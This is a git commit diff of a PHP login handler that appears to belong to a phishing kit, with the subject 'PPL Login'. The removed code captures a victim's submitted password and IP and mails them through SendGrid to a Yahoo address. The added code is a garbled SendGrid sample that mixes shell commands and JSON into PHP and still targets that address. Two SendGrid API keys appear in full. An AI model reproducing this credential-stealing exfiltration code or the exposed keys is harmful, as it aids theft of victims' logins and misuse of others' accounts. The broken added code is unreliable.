e626ca77f60439b36888a9421e0527713531d9a4
survivoralli <44983579+survivoralli@users.noreply.github.com>
2018-11-23 09:33:59 +0300

    Update sand_login.php

--- secure/summary/system/sand_login.php
+++ secure/summary/system/sand_login.php
@@ -7,10 +7,6 @@
 //#     # #   #  ### #     # #   ## #    # #        #   #      #    #   #   #      #    #   # #     #   
 //#     # #    # ###  #####  #    # #####  ######   #   ######  ####    #   ###### #####     #    ##### 
 
-
-
-
-
 include 'function.php';
 include("system.php");
 
@@ -19,28 +15,73 @@ $_SESSION['Password']=$_POST['login_password'];
 
 $ip=$_SESSION['ip']=getip();
 
-require_once "Mail.php";
-$from = "Sandra Sender <newby.jade@Norplay.com>";
-$to = "<newby.jade@yahoo.com>";
-$subject=$_SESSION['subject']=" PPL Login | ".$ip."" . "\r\n";
-$body = "Hi,\n\nHow are you?";
-$host = "smtp.sendgrid.net";
-$username = "apikey";
-$password = "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";
-$headers = array ('From' => $from,
-  'To' => $to,
-  'Subject' => $subject);
-$smtp = Mail::factory('smtp',
-  array ('host' => $host,
-    'auth' => true,
-    'username' => $username,
-    'password' => $password));
-$mail = $smtp->send($to, $headers, $_SESSION);
-if (PEAR::isError($mail)) {
-  echo("<p>" . $mail->getMessage() . "</p>");
- } else {
-  echo("<p>Message successfully sent!</p>");
- }
+
+echo "export SENDGRID_API_KEY='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'" > sendgrid.env
+echo "sendgrid.env" >> .gitignore
+source ./sendgrid.env
+
+{
+  "require": {
+    "sendgrid/sendgrid": "~7"
+  }
+}
+
+
+
+equire 'vendor/autoload.php'; // If you're using Composer (recommended)
+// Comment out the above line if not using Composer
+// require("<PATH TO>/sendgrid-php.php");
+// If not using Composer, uncomment the above line and
+// download sendgrid-php.zip from the latest release here,
+// replacing <PATH TO> with the path to the sendgrid-php.php file,
+// which is included in the download:
+// https://github.com/sendgrid/sendgrid-php/releases
+$email = new \SendGrid\Mail\Mail(); 
+$email->setFrom("aw@exeramplfrte.com", "Example User");
+$email->setSubject("Sending with SendGrid is Fun");
+$email->addTo("newby.jade@yahoo.com", "Example User");
+$email->addContent("text/plain", "and easy to do anywhere, even with PHP");
+$email->addContent(
+    "text/html", "<strong>and easy to do anywhere, even with PHP</strong>"
+);
+$sendgrid = new \SendGrid(getenv('SENDGRID_API_KEY'));
+try {
+    $response = $sendgrid->send($email);
+    print $response->statusCode() . "\n";
+    print_r($response->headers());
+    print $response->body() . "\n";
+} catch (Exception $e) {
+    echo 'Caught exception: '. $e->getMessage() ."\n";
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 ?>
